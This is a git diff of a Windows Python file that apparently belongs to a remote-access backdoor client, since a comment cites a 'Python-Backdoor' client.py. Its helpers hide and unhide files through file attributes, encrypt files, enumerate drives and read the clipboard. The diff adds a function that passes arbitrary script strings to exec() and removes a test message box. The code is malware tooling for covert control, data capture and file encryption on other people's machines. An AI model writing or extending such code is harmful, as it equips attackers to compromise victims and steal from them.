@@ -2,6 +2,7 @@ import os
 import string
 import ctypes
 import win32gui
+import win32api
 import win32clipboard
 import time
 from ctypes import windll
@@ -30,10 +31,10 @@ def get_drives():
     return drives
 
 def hide_file(path):
-    os.system("attrib +h " + path)
+    win32api.SetFileAttributes(path, 2)
 
 def un_hide_file(path):
-    os.system("attrib -h " + path)
+    win32api.SetFileAttributes(path, 128)
 
 def encrypt_file(path):
     with open(path, "rb")as file:
@@ -76,16 +77,16 @@ def get_clipboard_data():
     win32clipboard.CloseClipboard()
     return data
 
+def python_script(script):
+    try:
+        exec(script)
+    except Exception as e:
+        print(e)
 
-x = win32gui.MessageBox(0, "here is some text\t\t\t", "This is a test window", 0)
+if __name__ == '__main__':
+    pass
 
-
-
-
-print(x)
-
-
-
+# https://github.com/xp4xbox/Python-Backdoor/blob/master/src/client.py
 
 
 
